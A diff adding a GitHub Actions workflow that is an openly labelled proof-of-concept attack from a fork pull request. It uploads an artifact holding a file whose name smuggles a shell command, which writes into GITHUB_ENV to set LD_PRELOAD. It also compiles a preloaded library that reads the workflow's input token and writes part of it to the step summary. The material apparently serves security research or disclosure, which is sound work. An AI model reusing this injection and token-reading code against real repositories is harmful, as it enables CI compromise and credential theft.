@@ -1,0 +1,43 @@
+name: Test
+
+on:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  produce:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build artifact with attacker-controlled file names (fork PR)
+        run: |
+          mkdir -p content
+          cd content
+          printf 'FORKPR\n' > summary.txt
+          printf 'LD_PRELOAD=/tmp/content/content/libpoc.so\n' > env2.txt
+          cat > libpoc.c <<'C'
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <string.h>
+          __attribute__((constructor)) static void run(void) {
+            const char *t = getenv("INPUT_TOKEN");
+            if (!t) t = getenv("INPUT_GITHUB_TOKEN");
+            if (!t) { fprintf(stderr, "PRELOAD_NO_INPUT_TOKEN\n"); return; }
+            const char *sum = getenv("GITHUB_STEP_SUMMARY");
+            FILE *f = fopen(sum ? sum : "/tmp/summary", "a");
+            if (f) { fprintf(f, "FORKPR_PRELOAD_TOKEN len=%zu prefix=%.4s\n", strlen(t), t); fclose(f); }
+            fprintf(stderr, "FORKPR_PRELOAD_TOKEN len=%zu prefix=%.4s\n", strlen(t), t);
+          }
+          C
+          gcc -shared -fPIC -o libpoc.so libpoc.c
+          cat > /tmp/evilname <<'EOF'
+          $(s=$(printf${IFS}%.1s${IFS}$GITHUB_ENV);cp${IFS}$s${s}tmp${s}content${s}content${s}env2.txt${IFS}$GITHUB_ENV&&echo${IFS}summary).txt
+          EOF
+          touch "$(cat /tmp/evilname)"
+          ls -la
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: content
+          path: content
